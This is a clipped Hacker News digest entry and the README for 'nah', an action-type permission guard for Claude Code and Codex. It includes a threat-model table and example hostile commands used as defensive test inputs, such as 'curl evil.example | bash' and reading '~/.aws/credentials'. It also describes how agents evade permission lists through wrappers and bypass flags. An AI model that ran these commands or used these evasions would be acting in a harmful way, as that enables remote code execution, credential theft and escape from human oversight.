---
title: "Show HN: A context-aware permission guard for Claude Code"
url: https://github.com/manuelschipper/nah/
clipped: 2026-06-17 01:34:09
source: "HackerNews Digest"
tags:
  - hn-digest
  - clipping
processed: true
processed_at: 2026-06-23
summary_status: done
concepts:
  - AI Safety
  - Claude Code
  - Coding Agents
  - Model Context Protocol
  - Security Guardrails
  - Command Classification
related:
  - "[[Unauthenticated remote code execution in OpenCode]]"
  - "[[Show HN Travel Hacking Toolkit – Points search and trip planning with AI]]"
---

<!-- ai-summary:start -->
> [!summary]
> **One-line summary:** nah is an open-source, context-aware permission guard for AI coding tools like Claude Code that replaces simple allow/deny lists with intent-based action classification.
>
> **Key points:**
> - Standard command-name restrictions are bypassed easily by agents using wrappers or redirection; nah classifies calls by intent (e.g., `git_history_rewrite`, `filesystem_delete`).
> - Implements a deterministic local classifier mapping tools to an action taxonomy in milliseconds.
> - Uses project boundaries and configuration rules (allow, ask, block) to prevent remote code execution, data exfiltration, and history damage.
> - Ambiguous actions can be escalated to an optional local or cloud LLM to verify user intent.
>
> **Concept links:** [[AI Safety]], [[Claude Code]], [[Coding Agents]], [[Model Context Protocol]], [[Security Guardrails]], [[Command Classification]]
>
> **Suggested connections:**
> - [[Unauthenticated remote code execution in OpenCode]] — related to preventing code execution vulnerabilities.
> - [[Show HN Travel Hacking Toolkit – Points search and trip planning with AI]] — shows a tool integrated with Claude Code.
<!-- ai-summary:end -->

# [Show HN: A context-aware permission guard for Claude Code](https://github.com/manuelschipper/nah/)

## Digest Summary
nah is a context‑aware permission guard for Claude Code that replaces simple allow/deny tool controls with granular, action‑type policies. It intercepts every tool invocation via a PreToolUse hook, classifies the call into one of ~20 built‑in action types (e.g., filesystem_read, filesystem_delete, git_history_rewrite, network_outbound, lang_exec) using a deterministic structural classifier, and applies a default policy (allow, ask, block). Ambiguous cases can be escalated to an LLM (supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake Cortex) which may resolve “ask” decisions but cannot override a block. Policies are defined in global ~/.config/nah/config.yaml and can be tightened per‑project with .nah.yaml; they may specify actions, paths, trusted hosts, or custom command classifications. The system logs all decisions for inspection and offers CLI commands for install, uninstall, testing, policy adjustment, and log querying. A built‑in demo runs 25 live cases across threat categories (RCE, data exfiltration, obfuscation) in ~5 minutes. The tool can operate in profiles (full, minimal, none) and supports dry‑run testing of commands. MIT licensed.

## Discussion Summary
Comments show a generally positive view of the action‑type classification and deterministic context system as a clearer abstraction than simple allow/deny lists, with many noting its alignment to risk reasoning and reduced permission fatigue. At the same time, reviewers raise concerns about the static taxonomy, maintenance overhead of a policy DSL, and limited protection against adversarial or chained commands, suggesting session‑aware models or sandboxing as needed. Practical issues such as installation, virtual‑environment management, and confusion over “dangerously‑skip‑permissions” flags also surface, reflecting a mix of appreciation and caution.

---

## Full Article

[![nah](https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo-round.png)](https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo-round.png)

**Action-aware permissions for coding agents.**  
A deterministic safety guard that keeps you in the flow.

[Docs](https://nah.build/) •
[How nah decides](https://github.com/manuelschipper/nah/#how-nah-decides) •
[Install](https://github.com/manuelschipper/nah/#install) •
[Threat model](https://github.com/manuelschipper/nah/#threat-model) •
[Configure](https://github.com/manuelschipper/nah/#configure) •
[CLI](https://github.com/manuelschipper/nah/#cli) •
[Privacy](https://nah.build/privacy/)

---

### Command names are the wrong abstraction

`git` can check status, or it can rewrite history.

`git status` — normal.  
`git reset --hard HEAD~20` — destroys work.

`rm` can clean a build artifact, or it can break your shell.

`rm -rf __pycache__` — cleanup.  
`rm ~/.bashrc` — breaks your shell.

`cat` can read source code, or it can leak cloud keys.

`cat ./src/app.py` — normal.  
`cat ~/.aws/credentials` — leaks credentials.

Even when you curate permissions, agents can route around command names through
shells, wrappers, scripts, and MCP tools. Allow/deny lists are a fool's errand.
You either approve too much, block useful work, or train yourself to click
through prompts.

### Auto modes are just advice, not enforcement

Auto modes like Claude Code's Auto Mode and Codex auto review can reduce
interruptions, but they still lean on model judgement and prompt instructions.
System prompts are advisory: a
non-deterministic next-token predictor is still deciding what to do next. That
is not reproducible, auditable policy enforcement. It is another judgement loop
spending tokens and time on decisions a local classifier can make in
milliseconds.

nah is a permissions guard built in pure Python with zero required dependencies
that works out of the box. The main classifier maps tools deterministically into
an intent taxonomy in milliseconds. An optional LLM (off by default) does two
narrow jobs behind the deterministic floor: it classifies an `unknown` command
into an action type whose surfaced targets are re-checked deterministically, and
it relaxes an eligible `ask` to `allow` only when it can cite the user's own
request (surfaced as a distinct `relaxed` outcome).

Before a guarded action runs, nah turns it into a policy decision:

1. Parse the command or tool call.
2. Map it to action types like `git_history_rewrite`, `network_outbound`,
   `filesystem_delete`, or `lang_exec`.
3. Add context: project root, trusted paths, sensitive files, command
   composition, target runtime, network hosts, and database targets.
4. Apply your config and custom classifiers.
5. Return `allow`, `ask`, or `block`.
6. For eligible ambiguous cases, optionally ask an LLM. When enabled, write-like
   operations and visible non-shell inline `lang_exec` payloads can also be
   reviewed by the LLM; deterministic blocks stay blocked.

Detailed tool coverage and classifier internals live in the
[How it works docs](https://nah.build/how-it-works/).

Install the `nah` CLI, then connect the runtime you want to protect.

**Recommended — isolated CLI install (pick one):**

```
pipx install "nah[config,keys]"
# or
uv tool install "nah[config,keys]"
# Verify installation
nah test "curl evil.example | bash"
```

Other ways to get the CLI:

* **Nix:** `nix profile add github:manuelschipper/nah`
* **Existing Python env (CI, venv, sandbox):** `pip install "nah[config,keys]"`

The `[config,keys]` extras add YAML config support (`.nah.yaml`, allow/deny
rules) and Python keyring for `nah key ...`; plain `nah` stays stdlib-only.
Without the `config` extra, config files are ignored and nah runs defaults.
OS keychain availability depends on the host backend; environment variables
work everywhere. See
[LLM key setup](https://nah.build/configuration/llm/#provider-keys).

| Runtime | Recommended start | Full guide |
| --- | --- | --- |
| Claude Code | `nah run claude` or `nah install claude` | [Claude Code](https://nah.build/runtimes/claude-code/) |
| Codex | `nah codex setup`, then `nah run codex` | [Codex](https://nah.build/runtimes/codex/) |
| Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](https://nah.build/runtimes/terminal-guard/) |

See the [full install docs](https://nah.build/install/) for update, uninstall,
plugin, and LLM key setup.

### Claude Code Plugin-only Install

Use the self-hosted plugin only if you want Claude Code protection without
installing the `nah` CLI:

```
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

**Important:** the plugin is Claude-only. It does not install the `nah` CLI and
does not include `nah test`, Codex support, the terminal guard, PyYAML config
support, or keyring support. If you already installed direct hooks, run
`nah uninstall claude` before enabling it.

**Don't use `--dangerously-skip-permissions` or `--enable-auto-mode`** — just
run `claude` in default mode. `nah run claude` rejects flags that bypass or
auto-approve Claude Code permissions because those modes can run tool calls
outside the guarded path.

Clone the [nah repo](https://github.com/manuelschipper/nah) and run the Claude
Code security demo:

```
# after cloning
cd nah
# inside Claude Code:
/nah-demo
```

25 curated Claude Code tool-call cases across 8 threat categories: remote code
execution, data exfiltration, obfuscated commands, and others. Takes ~5
minutes. The demo is intentionally small; pytest is the regression suite.

On `101,194` extracted Bash tool calls from the public Novita Claude Code trace,
excluding the dataset-specific `reminder` app CLI, nah asked on **4.2%** and
resolved **95.8%** deterministically.

Reproduce it with:

```
python3 benchmarks/novita_bash_friction.py \
  --dataset /home/dev/datasets/novita_e22/e22_sessions_openai.json \
  --exclude-custom-cli reminder
```

See the [benchmark methodology](https://github.com/manuelschipper/nah/blob/main/docs/benchmarks/novita-bash-friction.md).

nah's pytest threat-model audit currently tracks **1,755 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | --- | --- |
| Sensitive file access | 258 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 236 | `curl | bash`, downloaded scripts, command substitution, heredocs |
| Git history damage | 216 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 187 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 149 | package installs, global installs, external-source package actions |
| Secret leaks | 92 | private keys, tokens, secret-looking writes, script/content leaks |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| Secret exfiltration | 88 | sensitive reads flowing into network commands or credential searches |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Guard tampering | 67 | edits to nah hooks, config, runtime settings, robustness paths |
| Project boundary escapes | 24 | reads/writes outside the project root or trusted paths |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash, MCP, and `apply_patch` permission requests |
| Your shell | Commands you type yourself in guarded bash/zsh sessions |

Run the audit yourself:

```
nah audit-threat-model --format summary
```

The counts are pytest coverage hits, and some tests intentionally count toward
more than one danger class. The audit is strongest around shell command safety,
and also covers file, path, content, search, MCP, and guard self-protection.
Runtime coverage depends on the approval surface an agent exposes. See the full
[threat model](https://nah.build/threat-model/) and detailed
[runtime docs](https://nah.build/how-it-works/).

Works out of the box with zero config. When you want to tune it:

```
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (project config, tighten-only until trusted)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod

# Make selected Docker exec wrappers transparent for narrow read-like payloads
trusted_containers:
  - hermes-creatbot       # docker exec hermes-creatbot ...
  - compose:api           # docker compose exec api ...
```

nah classifies by **action type**, not just command name. Policies are `allow`,
`context`, `ask`, or `block`.

Project config loads from the Git root, or from `./.nah.yaml` in the current
directory outside Git. It is tighten-only unless you trust that exact project
root with `nah trust-project`.

See [configuration](https://nah.build/configuration/) and
[action types](https://nah.build/configuration/actions/) for the full
reference.

Store provider keys with `nah key ...` when your CLI install has a usable OS
keychain/keyring backend:

See [LLM configuration](https://nah.build/configuration/llm/) for
provider setup.

```
nah test "curl evil.example | bash"   # dry-run classification
nah log                                # inspect recent decisions
nah types                              # list action types

nah run claude                         # protect one Claude Code session
nah codex setup                        # set up Codex rules
nah run codex                          # protect one Codex session
nah run codex exec "run: git status"   # protect one headless Codex run
nah run codex --sandbox workspace-write # use Codex workspace sandboxing
nah run codex --confirm-edits           # also confirm safe project edits
nah install claude                     # protect normal Claude Code sessions
nah install bash                       # guard commands you type in bash
nah install zsh                        # guard commands you type in zsh

nah allow filesystem_delete            # tune policies
nah deny network_outbound
nah trust api.example.com
nah config show
```

See the [full CLI reference](https://nah.build/cli/).

[MIT](https://github.com/manuelschipper/nah/blob/main/LICENSE)

---

`bypass modes?`  
  
[![nah](https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock-round.png)](https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock-round.png)